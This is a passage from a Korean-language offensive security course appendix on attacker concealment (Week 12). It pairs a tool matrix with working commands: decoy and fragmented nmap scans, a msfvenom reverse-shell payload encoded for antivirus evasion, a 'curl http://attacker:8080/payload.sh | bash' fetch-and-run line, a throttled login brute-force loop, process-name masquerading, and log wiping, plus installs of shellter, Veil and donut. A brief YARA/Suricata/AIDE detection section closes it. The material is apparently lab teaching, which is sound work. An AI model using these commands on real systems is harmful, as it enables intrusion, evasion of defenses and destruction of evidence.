...
## 부록: 학습 OSS 도구 매트릭스 (Course1 Attack — Week 12 은닉)

| 기법 | lab step | 본문 도구 | OSS 도구 옵션 | 비고 |
|------|----------|----------|---------------|------|
| 패킷 분할 (IDS 우회) | s1 | `nmap -f` | nmap -f / -mtu / fragroute | fragroute 자동 |
| 디코이 IP | s2 | `nmap -D` | nmap -D RND:10 / scapy | random decoy |
| 타이밍 회피 | s3 | `nmap -T0` | nmap -T0~1 / paranoid mode | 매우 느림 |
| 인코딩 (URL/base64) | s4 | `python3 base64` | python3 / base32/64 / hex | OS 기본 |
| 페이로드 난독화 | s5 | `msfvenom -e` | msfvenom encoders / shellter / veil-evasion | shellter = PE injector |
| User-agent 위장 | s6 | `curl -A` | curl -A / wget --user-agent / Burp | |
| HTTPS 위장 | s7 | `curl --insecure` | curl / mitmproxy fake CA / cloudflared | |
| 시간 지연 | s8 | `sleep` | bash / cron 랜덤 / msf sleep_ramdomize | 트래픽 분산 |
| Living-Off-The-Land | s9 | `curl/wget/python3` | LOLBAS (Win) / GTFOBins (Linux) | 정식 도구 악용 |
| 로그 삭제 (탈취 후) | s10 | `> /var/log/...` | log-killer / shred / wipe | |
| 위장 (rename binary) | s11 | `cp /usr/bin/bash /tmp/[kworker]` | mv / cp / setname | process 이름 위장 |
| AV 우회 (서명 변형) | s12 | `msfvenom -i 10` | shellter / veil / hyperion / donut | donut = .NET |
| Memory-only payload | s13 | shellcode injection | sliver implant in-memory / msf | sliver beacon |
| 보고 | s15 | text | yara rules (방어 측) | yara 매칭 |
...
sudo apt update && sudo apt install -y \
  nmap fragroute \
  python3-pip git \
  yara                         # rule 매칭 (방어/공격 양면)

# shellter — Windows PE injector (Wine 필요)
sudo apt install -y shellter wine

# veil-evasion (오래됨, 학습 참고만)
git clone https://github.com/Veil-Framework/Veil.git ~/Veil 2>/dev/null

# donut — .NET / shellcode generator
git clone https://github.com/TheWover/donut.git ~/donut
cd ~/donut && make
```
...
```bash
# 1) nmap 은닉 스캔 조합
sudo nmap -sS -f --mtu 16 -D RND:10 -T1 --data-length 25 \
  --source-port 53 -p 80,443 10.20.30.80
# -f 분할 / -D 디코이 / -T1 paranoid / data-length 페이로드 길이 / source-port 53 = DNS 위장

# 2) msfvenom 인코딩
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 \
  -f elf -o /tmp/encoded.elf
# -e 인코더 / -i 횟수

# 3) Living-Off-The-Land (Linux)
# /usr/bin/curl 은 모든 시스템에 있음 — AV 가 차단 안 함
curl http://attacker:8080/payload.sh | bash      # 정상 도구 사용

# 4) 시간 회피 (느린 brute)
for u in $(cat users.txt); do
  curl -X POST http://target/login -d "u=$u&p=Pa$$w0rd"
  sleep $((RANDOM % 30 + 30))                    # 30~60s 랜덤
done

# 5) Process 이름 위장
cp /bin/bash /tmp/.kworker
exec -a "[kworker/u8:1]" /tmp/.kworker -i        # 커널 worker 처럼 보임
```
...
```bash
# YARA — 시그니처 매칭
yara /opt/yara-rules/index.yar /tmp/suspicious.elf

# Suricata — IDS 시그니처
# /etc/suricata/rules/emerging-malware.rules
suricata-update                      # 룰셋 업데이트

# AIDE — 파일 무결성 (defacement 탐지)
sudo aide --init && sudo aide --check
```

학생은 본 12주차에서 **공격자의 은닉 5축 (분할/디코이/timing/인코딩/LOTL)** 과 **방어자의 탐지 (YARA/Suricata/AIDE)** 양면을 도구로 직접 검증한다.
